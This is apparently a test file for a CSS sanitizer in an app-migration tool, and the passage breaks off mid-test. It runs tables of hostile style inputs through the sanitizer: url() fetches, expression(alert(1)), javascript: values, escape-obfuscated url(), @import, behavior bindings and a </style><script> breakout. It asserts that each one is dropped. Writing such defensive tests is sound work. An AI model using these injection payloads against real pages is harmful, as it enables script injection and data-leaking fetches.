import assert from 'node:assert/strict';
import { join } from 'node:path';
import { pathToFileURL } from 'node:url';
import { test } from 'node:test';
import { JSDOM } from 'jsdom';
import { deriveIr, parse, type App } from '../../core/src/index.js';
import { applyLabels } from '../src/decorations/labels.js';
import { buildModel } from '../src/model.js';
import {
  calcArgsSafe,
  carriedStyleRules,
  carryStaticStyle,
  cleanStyle,
  droppedStyleRules,
  droppedStyleRulesTodo,
  inlineConstantStyleCalls,
  malformedStyleDeclarations,
  replaceStyleCalls,
  sanitizeSnippet as buildSanitize,
  stripStyleComments,
  styleBranchMarkers,
  styleValues,
} from '../src/pages.js';
import {
  calcArgsSafe as printCalcArgsSafe,
  cleanPrintStyle,
  replaceStyleCalls as printReplaceStyleCalls,
  stripStyleComments as printStripStyleComments,
} from '../../shims/src/print-template.js';

// Inline style attributes are checked declaration by declaration, by two
// copies of the same rule: the generator's sanitizer and the browser
// runtime's. One vector table runs through both, and both must agree.

type Runtime = { sanitizeSnippet(raw: string, doc: unknown, dropped?: string[]): string };

async function runtime(): Promise<Runtime> {
  return (await import(pathToFileURL(join(process.cwd(), 'packages/ui/src/client-runtime.js')).href)) as Runtime;
}

/** [label, style attribute value, style kept (null: no style attribute), property names reported as dropped]. */
const VECTORS: Array<[string, string, string | null, string[]]> = [
  // Shapes the exported apps use: kept whole.
  ['rgb() inside a border shorthand', 'width: 80%; border-bottom: 1px solid rgb(221, 221, 221)', 'width: 80%; border-bottom: 1px solid rgb(221, 221, 221)', []],
  ['rgba() inside a background shorthand', 'background: rgba(0, 0, 0, .5) no-repeat', 'background: rgba(0, 0, 0, .5) no-repeat', []],
  ['hsl() and hsla() tokens', 'border-color: hsl(120, 50%, 50%) hsla(0, 0%, 0%, 0.2)', 'border-color: hsl(120, 50%, 50%) hsla(0, 0%, 0%, 0.2)', []],
  ['space-separated rgb() with alpha', 'color: rgb(1 2 3 / 50%)', 'color: rgb(1 2 3 / 50%)', []],
  ['hue-rotate filter', '-webkit-filter:hue-rotate(50deg)', '-webkit-filter:hue-rotate(50deg)', []],
  ['scaleX transform', 'transform: scaleX(1.7)', 'transform: scaleX(1.7)', []],
  ['chained transforms', 'transform: rotate(45deg) translate(10px, -5px) skew(10deg) scale(1.2, .8)', 'transform: rotate(45deg) translate(10px, -5px) skew(10deg) scale(1.2, .8)', []],
  ['quoted font name', 'font-family:"karla"', 'font-family:"karla"', []],
  ['quoted font list', "font-family: 'Open Sans', Arial, sans-serif", "font-family: 'Open Sans', Arial, sans-serif", []],
  ['important flag', 'color:red !important', 'color:red !important', []],
  ['empty declarations', 'color:red;;', 'color:red;;', []],
  ['font shorthand with a slash', 'font: 12px/1.5 Arial', 'font: 12px/1.5 Arial', []],
  ['font shorthand with a quoted font name', "font: 12px/1.5 'Catamaran', sans-serif", "font: 12px/1.5 'Catamaran', sans-serif", []],
  ['commented-out declaration beside a valid one', 'height:35px;/* border:1px solid #ededed; */', 'height:35px', []],
  // Safe calc() is carried over. A trailing token with no colon is not a declaration.
  ['calc() addition', 'width:calc(1px + 2px)', 'width:calc(1px + 2px)', []],
  ['calc() with subtraction and decimals', 'width:calc(70% - 1.5px)', 'width:calc(70% - 1.5px)', []],
  ['calc() multiplication', 'width:calc(1em*2)', 'width:calc(1em*2)', []],
  ['calc() division', 'width:calc(100% / 2)', 'width:calc(100% / 2)', []],
  ['calc() double minus', 'width:calc(1px - -2px)', 'width:calc(1px - -2px)', []],
  ['calc() case and units', 'width:CALC(1PX + 2PX)', 'width:CALC(1PX + 2PX)', []],
  ['calc() across newlines', 'width:calc(1px\n+\n2px)', 'width:calc(1px\n+\n2px)', []],
  ['calc() important flag', 'width:calc(1px + 2px) !important', 'width:calc(1px + 2px) !important', []],
  ['calc() with a comment stripped', 'width:calc(1px /**/ + 2px)', 'width:calc(1px  + 2px)', []],
  ['trailing non-declaration identifier ignored', 'font-size:15px;text', 'font-size:15px', []],
  ['trailing brace stripped', 'width:1px;}', 'width:1px', []],
  // One bad declaration no longer takes the safe ones with it.
  ['name=value pair beside a valid one is skipped like a browser skips it', 'margin=10px; color: red', 'color: red', []],
  ['pair with a call is still refused', 'margin=expression(1); color: red', 'color: red', ['?']],
  ['pair with a quote is still refused', 'margin="1px"; color: red', 'color: red', ['?']],
  ['url() beside a width', 'width: 80%; background: url(//example.test/x)', 'width: 80%', ['background']],
  ['quoted semicolon', 'content:"a;b";color:red', 'color:red', ['content', '?']],
  ['escape in a second declaration', 'background:red;content:attr(data-x);background:u\\72 l(//example.test/?)', 'background:red', ['content', 'background']],
  // Fetches and script, plain or encoded: always dropped.
  ['url()', 'background:url(//example.test/x)', null, ['background']],
  // A fetched background shipped under bg/ is the one url() an inline style keeps: background properties only, exact name shape.
  ['fetched background image', 'background-image:url(bg/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.png)', 'background-image:url(bg/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.png)', []],
  ['fetched background beside a size', 'background:url(bg/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.webp) no-repeat; width: 5px', 'background:url(bg/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.webp) no-repeat; width: 5px', []],
  ['fetched background name on another property', 'list-style-image:url(bg/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.png)', null, ['list-style-image']],
  ['bg/ with a short name', 'background:url(bg/abc.png)', null, ['background']],
  ['bg/ with a svg extension', 'background:url(bg/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.svg)', null, ['background']],
  ['bg/ with a traversal', 'background:url(bg/../aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.png)', null, ['background']],
  ['bg/ with a host', 'background:url(//example.test/bg/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.png)', null, ['background']],
  ['bg/ with a second url', 'background:url(bg/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.png), url(//example.test/x)', null, ['background']],
  ['bg/ with a quote', "background:url('bg/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.png')", null, ['background']],
  ['upper-case URL(', 'background:URL(//example.test/x)', null, ['background']],
  ['url with a space before the paren', 'background:url (//example.test/x)', null, ['background']],
  ['url with a tab before the paren', 'background:UrL\t(//example.test/x)', null, ['background']],
  ['expression()', 'width:expression(alert(1))', null, ['width']],
  ['CSS escape in a url()', 'background:u\\72 l(//example.test/x)', null, ['background']],
  ['long CSS escapes', 'background:\\75\\72\\6c(//example.test/x)', null, ['background']],
  ['mixed-case CSS escape', 'background:uR\\4c(//example.test/x)', null, ['background']],
  ['comment inside url', 'background:u/**/rl(//example.test/x)', null, ['background']],
  ['image-set string URL', 'background:image-set("https://example.test/x" 1x)', null, ['background']],
  ['-webkit-image-set string URL', 'background:-webkit-image-set("https://example.test/x" 1x)', null, ['background']],
  ['image()', 'background:image("https://example.test/x")', null, ['background']],
  ['src()', 'background:src("https://example.test/x")', null, ['background']],
  ['cross-fade()', 'background:-webkit-cross-fade(url(a), url(b), 50%)', null, ['background']],
  ['element()', 'background:element(#x)', null, ['background']],
  ['attr()', 'content:attr(data-x)', null, ['content']],
  ['var()', 'width:var(--x)', null, ['width']],
  ['calc() containing url()', 'width:calc(url(x))', null, ['width']],
  ['calc() plus url()', 'width:calc(1px + url(x))', null, ['width']],
  ['calc() glued to url()', 'width:calc(1px)url(x)', null, ['width']],
  ['calc() containing expression()', 'width:calc(expression(alert(1)))', null, ['width']],
  ['calc() plus var()', 'width:calc(1px + var(--x))', null, ['width']],
  ['nested calc()', 'width:calc(calc(1px) + 1px)', null, ['width']],
  ['quoted calc()', 'width:calc("1px")', null, ['width']],
  ['backslash inside calc()', 'width:calc(1\\70 x)', null, ['width']],
  ['backslash before calc close', 'width:calc(1px\\29 )', null, ['width']],
  ['escaped calc name', 'width:c\\61 lc(1px)', null, ['width']],
  ['escaped leading calc', 'width:\\63 alc(1px)', null, ['width']],
  ['calc split onto a url()', 'width:calc(1px ; background:url(x))', null, ['width', 'background']],
  ['unbalanced calc()', 'width:calc(1px', null, ['width']],
  ['empty calc()', 'width:calc()', null, ['width']],
  ['prefixed calc()', 'width:-webkit-calc(1px)', null, ['width']],
  ['comma in calc()', 'width:calc(1px, 2px)', null, ['width']],
  ['attr() in calc()', 'width:calc(attr(x))', null, ['width']],
  ['env() in calc()', 'width:calc(env(safe-area-inset-bottom))', null, ['width']],
  ['NUL inside calc()', 'width:calc(1\u0000px)', null, ['width']],
  ['fullwidth digit in calc()', 'width:calc(\uFF11px)', null, ['width']],
  ['scientific notation in calc()', 'width:calc(1e3px)', null, ['width']],
  ['calc breakout after a semicolon', 'width:calc(1px + 2px);}body{background:red', 'width:calc(1px + 2px)', ['?']],
  ['brace breakout in a value without a semicolon', 'width:1px}body{background:red', null, ['width']],
  ['newline-joined image-set', 'color:red\nbackground:image-set("https://example.test/x" 1x)', null, ['color']],
  ['escaped property name', 'w\\69dth:1px', null, ['?']],
  ['escaped behavior', 'b\\65havior:url(x.htc)', null, ['?']],
  ['escaped background name', '\\62 ackground:red', null, ['?']],
  ['behavior', 'behavior:url(x.htc)', null, ['behavior']],
  ['-moz-binding', '-moz-binding:url(x.xml#y)', null, ['-moz-binding']],
  ['empty property name', ':red', null, ['?']],
  ['@import', 'x:1px;@import "//example.test/x"', 'x:1px', ['?']],
  ['javascript: in a value', 'background:javascript:alert(1)', null, ['background']],
  ['entity-encoded url(', 'color:&#117;rl(//example.test/x)', null, ['color']],
  ['quoted value outside font-family', 'content:"red"', null, ['content']],
  ['escape inside a quoted font name', 'font-family:"a\\62 c"', null, ['font-family']],
  ['url() inside a transform', 'transform: rotate(url(x))', null, ['transform']],
  ['var() inside a colour', 'color: rgb(var(--x), 0, 0)', null, ['color']],
  ['unknown function', 'color: paint(x)', null, ['color']],
  ['url() after a colour token', 'border: 1px solid rgb(1, 2, 3) url(//example.test/x)', null, ['border']],
  ['style tag close in value', 'color:</style>', null, ['color']],
  ['10k style value', 'color:' + 'a'.repeat(10000), null, ['?']],
];

function styleOf(html: string): { style: string | null; dropped: string | null } {
  const div = new JSDOM(`<body>${html}</body>`).window.document.querySelector('div');
  assert.ok(div, html);
  return { style: div.getAttribute('style'), dropped: div.getAttribute('data-style-dropped') };
}

test('a style attribute keeps its safe declarations and names the dropped ones, in both sanitizers', async () => {
  const run = await runtime();
  const doc = new JSDOM('<!doctype html><html><body></body></html>').window.document;
  for (const [label, value, kept, dropped] of VECTORS) {
    const html = `<div style="${value.replace(/"/g, '&quot;')}">x</div>`;
    const fromRuntime: string[] = [];
    const fromBuild: string[] = [];
    const runtimeHtml = run.sanitizeSnippet(html, doc, fromRuntime);
    const buildHtml = buildSanitize(html, fromBuild);
    assert.equal(runtimeHtml, buildHtml, `${label}: both sanitizers agree`);
    const out = styleOf(buildHtml);
    assert.equal(out.style, kept, `${label}: kept style`);
    assert.equal(out.dropped, dropped.length ? dropped.join(' ') : null, `${label}: data-style-dropped`);
    assert.deepEqual(fromRuntime, dropped, `${label}: runtime report`);
    assert.deepEqual(fromBuild, dropped, `${label}: build report`);
    assert.deepEqual(cleanPrintStyle(value), cleanStyle(value), `${label}: print template sanitizer agrees`);
    // The one url() that may survive is a fetched image under bg/ named by its sha256.
    if (out.style) assert.doesNotMatch(out.style.replace(/url\(bg\/[0-9a-f]{64}\.(?:png|jpg|gif|webp)\)/g, '').replace(/background-image/g, 'background'), /url|image|expression|attr|var\(|\\|\/\*|@|behavior|binding/i, `${label}: no fetch survives`);
  }
});

test('a notes block that loses a style declaration is listed as a TODO', () => {
  const app: App = deriveIr(
    parse(`application "Demo"\n{\n\tform Add_Product\n\t{\n\t\tdisplayname = "Add Product"\n\t\tplain\n\t\t(\n\t\t\ttype = plaintext\n\t\t\tvalue = "<div style='width: 80%; border-bottom: 1px solid rgb(221, 221, 221); background: url(//example.test/x)'>Title</div>"\n\t\t)\n\t\tName\n\t\t(\n\t\t\ttype = text\n\t\t)\n\t}\n}\n`),
  );
  const model = buildModel(app);
  applyLabels(app, model);
  const todo = model.todos.find((item) => item.name === 'Add_Product.plain');
  assert.ok(todo, JSON.stringify(model.todos));
  assert.equal(todo.area, 'field');
  assert.match(todo.reason, /Inline style declarations not carried over.*background/);
  assert.doesNotMatch(todo.reason, /border-bottom|width/);
  assert.equal(
    todo.manualStep,
    'In form Add_Product, the notes field plain lost the inline style declarations background to the sanitizer. Re-create that styling by hand with a class in the app stylesheet, using only safe CSS (no url(), expressions, or scripts), then check the layout.',
  );
});

test('a nested notes block keeps its field path in the TODO name', () => {
  const app: App = deriveIr(parse(`application "Demo"\n{\n\tform Orders\n\t{\n\t\tItems\n\t\t(\n\t\t\ttype = subform\n\t\t)\n\t}\n}\n`));
  const model = buildModel(app);
  const form = model.forms[0]!;
  const items = form.fields.find((field) => field.name === 'Items')!;
  items.subfields = [{ ...items, name: 'plain', widget: 'notes', notesHtml: `<div style="background: url(//example.test/x)">x</div>` }];
  applyLabels(app, model);
  assert.equal(model.todos.some((item) => item.name === 'Orders.Items.plain'), true);
  assert.equal(model.todos.some((item) => item.name === 'Orders.plain'), false);
});

test('a page snippet that loses a style declaration is listed as a TODO', () => {
  const zml = `<zml><layout><row><column width='100%'><dsp id='html_snippet'><![CDATA[<div style="color: red; transform: rotate(url(x))">Hi</div><p style="border: 1px solid rgb(1, 2, 3)">Ok</p>]]></dsp></column></row></layout></zml>`;
  const app: App = deriveIr(
    parse(`application "Demo"\n{\n\tpages\n\t{\n\t\tpage Home\n\t\t{\n\t\t\tdisplayname = "Home"\n\t\t\tContent="${delugeString(zml)}"\n\t\t}\n\t}\n}\n`),
  );
  const model = buildModel(app);
  const todo = model.todos.find((item) => item.area === 'zml' && /Inline style/.test(item.reason));
  assert.ok(todo, JSON.stringify(model.todos));
  assert.match(todo.reason, /transform/);
  const snippet = model.pages[0]?.elements.flatMap(function all(el): typeof model.pages[0]['elements'] {
    return [el, ...el.children.flatMap(all)];
  }).find((el) => el.kind === 'html');
  assert.match(snippet?.html ?? '', /style="color: red" data-style-dropped="transform"/);
  assert.match(snippet?.html ?? '', /style="border: 1px solid rgb\(1, 2, 3\)"/);
});

test('a name=value pair styles nothing in a browser, so it is not a lost declaration', () => {
  const { model, html } = pageModel(['<table><tr><td style = "width=3%">1</td><td style="color: red">x</td></tr></table>']);
  assert.deepEqual(model.todos.filter((item) => /Inline style/.test(item.reason)), []);
  assert.doesNotMatch(html[0]?.html ?? '', /data-style-dropped/);
  assert.match(html[0]?.html ?? '', /style="color: red"/);
  assert.doesNotMatch(html[0]?.html ?? '', /width=3/);
});

test('a gradient around colour calls is carried, and any nested call that is not a colour or number stays refused', () => {
  const kept = [
    'background:radial-gradient(rgb(120,120,120) ,\trgb(80,80,80))',
    'background-image: linear-gradient(to right, rgba(0, 0, 0, .5), #fff)',
    'background: linear-gradient(rgb(1,2,3),rgb(4,5,6))',
  ];
  for (const value of kept) assert.deepEqual(cleanStyle(value), { style: value, dropped: [] }, value);
  const refused = [
    'background:linear-gradient(url(x),red)',
    'background:linear-gradient(rgb(1,2,3),foo(1))',
    'background:linear-gradient(rgb(1,2,3),expression(1))',
    'background:rotate(rgb(1,2,3))',
    'background:calc(calc(1px + 2px))',
    'background:rgb(rgb(1,2,3))',
    'background:linear-gradient(rgb(1,2,3),rgb(4,5,6)',
    'width:calc(rgb(1,2,3))',
  ];
  for (const value of refused) assert.deepEqual(cleanStyle(value), { style: '', dropped: [value.slice(0, value.indexOf(':'))] }, value);
  const { model, html } = pageModel(['<div style="background:radial-gradient(rgb(120,120,120) , rgb(80,80,80))">x</div>']);
  assert.deepEqual(model.todos.filter((item) => /Inline style/.test(item.reason)), []);
  assert.match(html[0]?.html ?? '', /radial-gradient\(rgb\(120,120,120\) , rgb\(80,80,80\)\)/);
});

test('a quoted word for text-align styles nothing in a browser, so the build sanitizer skips it unreported', () => {
  assert.deepEqual(cleanStyle('text-align:"center"; color: red'), { style: 'color: red', dropped: [] });
  assert.deepEqual(cleanStyle("text-align:'center'"), { style: '', dropped: [] });
  assert.deepEqual(cleanStyle('width:"10px"; color: red'), { style: 'color: red', dropped: ['width'] });
  assert.deepEqual(cleanStyle('text-align:"a b"; color: red'), { style: 'color: red', dropped: ['text-align'] });
});

test('a quoted text-align the browser never applied is not a lost declaration', () => {
  const { model, html } = pageModel(['<table><tr><td valign="top" style=text-align:"center"> </td><td style="color: red">x</td></tr></table>']);
  assert.deepEqual(model.todos.filter((item) => /Inline style/.test(item.reason)), []);
  assert.doesNotMatch(html[0]?.html ?? '', /data-style-dropped|text-align/);
});

test('a malformed inline declaration is named by its source text in the TODO, not as ?', () => {
  const { model, html } = pageModel([
    '<table><tr><td style = "@import x">1</td><td style="color: red">x</td></tr></table>',
    '<p style="margin=expression(1); color: blue">a</p><% if (true) { %><b>b</b><% } %>',
  ]);
  const todos = model.todos.filter((item) => /Inline style/.test(item.reason));
  assert.deepEqual(
    todos.map((item) => item.reason),
    [
      'Inline style declarations not carried over (unsafe or unsupported CSS): "@import x"',
      'Inline style declarations not carried over (unsafe or unsupported CSS): "margin=expression(1)"',
    ],
  );
  assert.match(todos[0]?.manualStep ?? '', /lost the inline style declarations "@import x" to the sanitizer/);
  assert.ok(todos.every((item) => !/declarations \?|: \?$/.test(`${item.reason} ${item.manualStep}`)), JSON.stringify(todos));
  // The source text only feeds the manual step; the generated element does not carry it.
  assert.ok(html.every((el) => el.refusedStyles === undefined));
  assert.match(html[0]?.html ?? '', /data-style-dropped="\?"/);
});

test('malformed inline declarations are listed in document order and a refused named property is not one', () => {
  assert.deepEqual(malformedStyleDeclarations(`<a style="width=3%; color: red">x</a><b style='behavior: url(x)'>y</b><i style="@import x;  a  =  b ">z</i>`), ['@import x']);
  assert.deepEqual(malformedStyleDeclarations('<p style="color: red; margin: 0">ok</p><p>nostyle</p>'), []);
  assert.deepEqual(malformedStyleDeclarations(`<p style="x=${'1'.repeat(9000)}">big</p>`).map((text) => text.length), [80]);
});

/** Escape text for a double-quoted Deluge string literal (backslashes first, then quotes, in one pass). */
function delugeString(text: string): string {
  return text.replace(/[\\"]/g, (ch) => `\\${ch}`);
}

function pageModel(snippets: string[]) {
  const cells = snippets.map((html, i) => `<column width='50%'><dsp id='snippet_${i}'><![CDATA[${html}]]></dsp></column>`).join('');
  const zml = `<zml><layout><row>${cells}</row></layout></zml>`;
  const app: App = deriveIr(
    parse(`application "Demo"\n{\n\tpages\n\t{\n\t\tpage Home\n\t\t{\n\t\t\tdisplayname = "Home"\n\t\t\tContent="${delugeString(zml)}"\n\t\t}\n\t}\n}\n`),
  );
  const model = buildModel(app);
  const elements = model.pages[0]?.elements.flatMap(function all(el): typeof model.pages[0]['elements'] {
    return [el, ...el.children.flatMap(all)];
  }) ?? [];
  return { model, html: elements.filter((el) => el.kind === 'html'), styleTodos: model.todos.filter((item) => item.name === 'Home.style'), scopedCss: model.pages[0]?.scopedCss ?? '' };
}

test('static <style> CSS is carried under the page scope and only rejected rules count', () => {
  const { html, styleTodos, scopedCss } = pageModel([
    '<style>.card { color: red; } /* a { } */ .title { font-weight: 700 }</style><div class="card">Hi</div>',
    '<div><style>@media (max-width: 600px) { .card { color: blue } }</style><p>Ok</p></div>',
  ]);
  assert.equal(styleTodos.length, 0, JSON.stringify(styleTodos));
  assert.match(scopedCss, /^\[data-page="Home"\] \.card\{color: red\}/);
  assert.match(scopedCss, /\.title\{font-weight: 700\}/);
  assert.match(scopedCss, /@media \(max-width: 600px\)\{\[data-page="Home"\] \.card\{color: blue\}\}/);
  assert.equal(html.length, 2);
  for (const el of html) {
    assert.doesNotMatch(el.html ?? '', /<style/i);
    assert.equal('droppedStyleRules' in el, false, 'the count stays off the generated element');
  }
});

test('static <style> CSS carries safe @supports feature queries with scoped rules', () => {
  const result = carryStaticStyle('@supports (display: grid) { .card { display: grid; gap: 1rem } }', '[data-page="Home"]');
  assert.deepEqual(result, {
    css: '@supports (display: grid){[data-page="Home"] .card{display: grid;gap: 1rem}}',
    droppedRules: 0,
    dropped: [],
  });
  assert.equal(carryStaticStyle('@supports (background: url(https://evil.test/x)) { .x { color: red } }', '[data-page="Home"]').droppedRules, 1);
});

test('dynamic CSS tags are counted individually in the page TODO', () => {
  const result = carriedStyleRules(
    '<style>.static { color: red } <%= buildCssOne() %> <%= buildCssTwo() %> <% buildCssThree(); %></style>',
    '[data-page="Home"]',
  );
  assert.equal(result.css, '[data-page="Home"] .static{color: red}');
  assert.equal(result.droppedRules, 3);
  assert.deepEqual(result.dropped, ['CSS built by a Deluge tag', 'CSS built by a Deluge tag', 'CSS built by a Deluge tag']);
});

test('static <style> CSS carries safe @supports combinators and drops nested @supports', () => {
  const combinator = carryStaticStyle(
    '@supports (display: grid) and (gap: 1rem) or not (display: flex) { .card { display: grid } }',
    '[data-page="Home"]',
  );
  assert.equal(combinator.css, '@supports (display: grid) and (gap: 1rem) or not (display: flex){[data-page="Home"] .card{display: grid}}');
  assert.equal(combinator.droppedRules, 0);

  const nested = carryStaticStyle(
    '@supports (display: grid) { @supports (gap: 1rem) { .card { gap: 1rem } } }',
    '[data-page="Home"]',
  );
  assert.equal(nested.droppedRules, 1);
});

test('static <style> CSS refuses @supports conditions carrying CSS escape sequences', () => {
  // mediaConditionSafe's allowed-character set has no backslash, so every
  // escaped form of url(/expression(/a brace is refused before a real CSS
  // engine would get a chance to decode it.
  const vectors = [
    '@supports (background: u\\72 l(https://evil.test/x)) { .x { color: red } }',
    '@supports (background: \\75\\72\\6c(https://evil.test/x)) { .x { color: red } }',
    '@supports (width: e\\78 pression(alert(1))) { .x { color: red } }',
    '@supports (background\\00007b color: red\\00007d body) { .x { color: red } }',
  ];
  for (const css of vectors) {
    const result = carryStaticStyle(css, '[data-page="Home"]');
    assert.equal(result.droppedRules, 1, css);
    assert.ok(!result.css.includes('url('), css);
    assert.ok(!result.css.includes('expression('), css);
  }
});

test('CSS tokenizer scopes selectors and refuses fetches, unsafe selectors, malformed declarations and at-rules once each', () => {
  const result = carryStaticStyle('.x, .y:hover { color: red; width: 80% } @import "x"; .z{background:url(https://x)} </style><script>{', '[data-page="Home"]');
  assert.equal(result.css, '[data-page="Home"] .x,[data-page="Home"] .y:hover{color: red;width: 80%}');
  assert.equal(result.droppedRules, 3);
  assert.deepEqual(result.dropped, ['@import', 'background declaration', 'unparsed CSS']);
  assert.deepEqual(carryStaticStyle('.x{color:red}', '[data-page="a"]'), { css: '[data-page="a"] .x{color:red}', droppedRules: 0, dropped: [] });
  const responsive = carryStaticStyle('@media (min-width: 768px) { .x > .y { width: 20% } }', '[data-page="a"]');
  assert.deepEqual(responsive, { css: '@media (min-width: 768px){[data-page="a"] .x > .y{width: 20%}}', droppedRules: 0, dropped: [] });
  const creatorDuplicateAt = carryStaticStyle('@@media only screen and (max-width:768px) { .x { width: 20px } }', '[data-page="a"]');
  assert.deepEqual(creatorDuplicateAt, { css: '@media only screen and (max-width:768px){[data-page="a"] .x{width: 20px}}', droppedRules: 0, dropped: [] });
  assert.equal(carryStaticStyle('@media (url(x)) {.x{color:red}}', '[data-page="a"]').droppedRules, 1);
});

test('@media inside @media is dropped, so deep nesting cannot recurse', () => {
  const nested = carryStaticStyle('@media screen { @media print { .x { color: red } } .y { color: blue } }', '[data-page="a"]');
  assert.equal(nested.droppedRules, 1);
  assert.equal(nested.css, '@media screen{[data-page="a"] .y{color: blue}}');
  // A depth a recursive parser cannot survive: naive recursion overflows the
  // call stack well before 100000 frames, so an iterative scanner proves the
  // guard without any wall-clock assertion.
  const naiveRecurse = (depth: number): number => (depth ? 1 + naiveRecurse(depth - 1) : 0);
  assert.throws(() => naiveRecurse(100000), RangeError);
  const deep = '@media all{'.repeat(100000) + '}'.repeat(100000);
  const start = performance.now();
  const result = carryStaticStyle(deep, '[data-page="a"]');
  const ms = performance.now() - start;
  assert.ok(ms < 2000, `100000 nested @media: ${ms.toFixed(1)}ms`);
  assert.equal(result.css, '');
  assert.equal(result.droppedRules, 1);
});

test('a stray top-level } loses nothing and is not counted, and the rest of the sheet still carries', () => {
  const result = carryStaticStyle('}.a{color:red}.b{color:blue}', '[data-page="a"]');
  assert.equal(result.droppedRules, 0);
  assert.equal(result.css, '[data-page="a"] .a{color:red}\n[data-page="a"] .b{color:blue}');
});

test('a data:image base64 url() carries since it fetches nothing; other data: targets stay refused', () => {
  const png = 'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==';
  const carried = carryStaticStyle(
    `.a{background-image:url(data:image/png;base64,${png})}.b{background:url("data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=") center}`,
    '[data-page="Home"]',
  );
  assert.equal(carried.droppedRules, 0);
  assert.equal(
    carried.css,
    `[data-page="Home"] .a{background-image:url(data:image/png;base64,${png})}\n[data-page="Home"] .b{background:url("data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=") center}`,
  );
  for (const css of [
    '.a{background-image:url(data:text/html;base64,PHNjcmlwdD4=)}',
    '.a{background-image:url(data:image/png,notbase64)}',
    '.a{background-image:url(data:image/png;charset=utf-8;base64,AAAA)}',
    '.a{background-image:url(data:image/png;base64,AAA%29)}',
    '.a{background-image:url(data:image/png;base64,AAAA),url(//x.test/a)}',
  ]) {
    const res = carryStaticStyle(css, '[data-page="Home"]');
    assert.equal(res.css, '', `expected empty css for: ${css}`);
    assert.equal(res.droppedRules, 1, `expected 1 dropped declaration for: ${css}`);
    assert.deepEqual(res.dropped, ['background-image declaration']);
  }
});

test('image-set() carries when every source is a safe url(); remote urls and bare strings stay refused', () => {
  const carried = carryStaticStyle(
    '.a{background-image:image-set(url(a.png) 1x, url(b-2x.png) 2x)}.b{background-image:-webkit-image-set(url(c.png) 1x)}',
    '[data-page="Home"]',
  );
  assert.equal(carried.droppedRules, 0);
  assert.equal(
    carried.css,
    '[data-page="Home"] .a{background-image:image-set(url(a.png) 1x, url(b-2x.png) 2x)}\n[data-page="Home"] .b{background-image:-webkit-image-set(url(c.png) 1x)}',
  );
  for (const css of [
    '.a{background-image:image-set(url(//x.test/a) 1x)}',
    '.a{background-image:image-set("a.png" 1x)}',
    '.a{background-image:image-set(url(a.png) 1x, url(//x.test/b) 2x)}',
  ]) {
    const res = carryStaticStyle(css, '[data-page="Home"]');
    assert.equal(res.css, '', `expected empty css for: ${css}`);
    assert.equal(res.droppedRules, 1, `expected 1 dropped declaration for: ${css}`);
  }
});

test('a <style> sheet wrapped in HTML comments carries like a browser parses it', () => {
  const wrapped = carryStaticStyle('<!--\n.a{color:red}\n.b{color:blue}\n-->', '[data-page="a"]');
  assert.equal(wrapped.droppedRules, 0);
  assert.equal(wrapped.css, '[data-page="a"] .a{color:red}\n[data-page="a"] .b{color:blue}');
  const inside = carryStaticStyle('.a{<!-- color:red; width:10% -->}.b{<!-- color:blue}', '[data-page="a"]');
  assert.equal(inside.droppedRules, 0);
  assert.equal(inside.css, '[data-page="a"] .a{color:red;width:10%}\n[data-page="a"] .b{color:blue}');
  // Outside the wrappers a dangerous declaration is still refused.
  const mixed = carryStaticStyle('<!-- .a{<!-- color:red -->; background:url(//x.test/a)} -->', '[data-page="a"]');
  assert.equal(mixed.droppedRules, 1);
  assert.deepEqual(mixed.dropped, ['background declaration']);
});

test('legacy *prop, _prop and \\9 IE-only hack declarations carry nothing and are not a loss', () => {
  // Every browser Creator supports ignores these at parse time, so the page
  // never applied them: leaving them out is the same rendering, not a loss.
  const result = carryStaticStyle('.a{*zoom:1;_height:50%;color:red}', '[data-page="a"]');
  assert.equal(result.droppedRules, 0);
  assert.equal(result.css, '[data-page="a"] .a{color:red}');
  const trailing = carryStaticStyle('.b{background-color:#004099 \\9;margin:0}', '[data-page="a"]');
  assert.equal(trailing.droppedRules, 0);
  assert.equal(trailing.css, '[data-page="a"] .b{margin:0}');
  // A hack never smuggles a fetch, script or expression into the carried CSS.
  for (const css of ['.a{*behavior:url(x.htc)}', '.a{_width:expression(alert(1))}', '.a{*background:url(//x.test/a)}', '.a{color:red\\9}', '.a{background:url(//x.test/a) \\9}']) {
    const res = carryStaticStyle(css, '[data-page="a"]');
    assert.doesNotMatch(res.css, /[:(]/, `expected no declaration carried for: ${css}`);
  }
  // A refused value is still counted when it is not a hack: only the hack shape is inert.
  assert.equal(carryStaticStyle('.a{background:url(//x.test/a)}', '[data-page="a"]').droppedRules, 1);
});

test('a stray close parenthesis invalidates only its own declaration, as a browser reads it', () => {
  // `rgb(...))` is invalid CSS: the browser ignores that one declaration and keeps the rest of the rule.
  const result = carryStaticStyle('#header{background-color:#333;box-shadow:0 0 7px rgb(33, 122, 239, 0.23));height:70px;position:relative}', '[data-page="a"]');
  assert.equal(result.droppedRules, 0);
  assert.equal(result.css, '[data-page="a"] #header{background-color:#333;height:70px;position:relative}');
  // The paren never turns a later `;` into text: a fetch after it is still refused and counted.
  const hostile = carryStaticStyle('.a{box-shadow:0 0 1px red));background:url(//x.test/a);color:blue}', '[data-page="a"]');
  assert.equal(hostile.css, '[data-page="a"] .a{color:blue}');
